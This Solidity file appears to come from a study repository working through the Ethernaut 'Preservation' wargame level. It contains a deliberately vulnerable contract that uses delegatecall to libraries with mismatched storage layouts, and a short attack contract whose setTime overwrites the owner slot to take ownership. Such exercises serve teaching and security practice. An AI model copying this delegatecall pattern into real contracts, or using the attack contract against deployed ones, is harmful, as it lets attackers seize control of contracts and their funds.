// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

// The goal of this level is for you to claim ownership of the Preservation contract.
// Understanding what it means for delegatecall to be context-preserving.
// Understanding how storage variables are stored and accessed.
// Understanding how casting works between different data types.
contract Preservation {
    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
  
    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
      timeZone1Library = _timeZone1LibraryAddress; 
      timeZone2Library = _timeZone2LibraryAddress; 
      owner = msg.sender;
    }
   
    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
      timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
  
    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
      timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}
  
// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp 
    uint storedTime;  

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

//See `test/Week17-18/EthernautPreservation.t.sol` for the exploit explanation.
contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }
}